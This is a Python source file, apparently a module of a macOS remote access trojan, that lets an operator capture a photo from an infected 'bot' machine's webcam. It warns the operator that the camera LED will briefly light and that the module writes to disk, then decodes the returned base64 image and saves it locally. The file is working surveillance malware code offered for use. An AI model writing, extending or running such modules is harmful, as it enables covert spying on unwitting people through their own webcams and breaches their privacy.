# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from base64 import b64decode
from os import mkdir

from server.modules.helper import *


class Module(ModuleABC):
    def get_info(self) -> dict:
        return {
            "Author:": ["Marten4n6"],
            "Description": "Take a picture using the bot's webcam.",
            "References": [
                "https://github.com/rharder/imagesnap"
            ],
            "Stoppable": False
        }

    def setup(self) -> Tuple[bool, Optional[dict]]:
        confirm = self._view.prompt("Are you sure you want to continue? [Y/n]", [
            ("A green LED will show next to the bot's camera (for about a second).", "attention"),
            ("This module also touches the disk.", "attention")
        ]).lower()

        if not confirm or confirm == "y":
            output_name = self._view.prompt("Local output name [ENTER for <RANDOM>]: ")

            if not output_name:
                output_name = random_string(8)

            return True, {
                "response_options": {
                    "output_name": output_name
                }
            }
        else:
            return False, None

    def process_response(self, response: bytes, response_options: dict):
        output_name = "{}.png".format(response_options["output_name"])
        output_file = path.join(OUTPUT_DIRECTORY, output_name)

        str_response = response.decode()

        if not path.isdir(OUTPUT_DIRECTORY):
            mkdir(OUTPUT_DIRECTORY)

        if "Error executing" in str_response:
            self._view.output(str_response)
        else:
            with open(output_file, "wb") as open_file:
                open_file.write(b64decode(response))

            self._view.output_separator()
            self._view.output("Webcam picture saved to: {}".format(path.realpath(output_file)), "info")
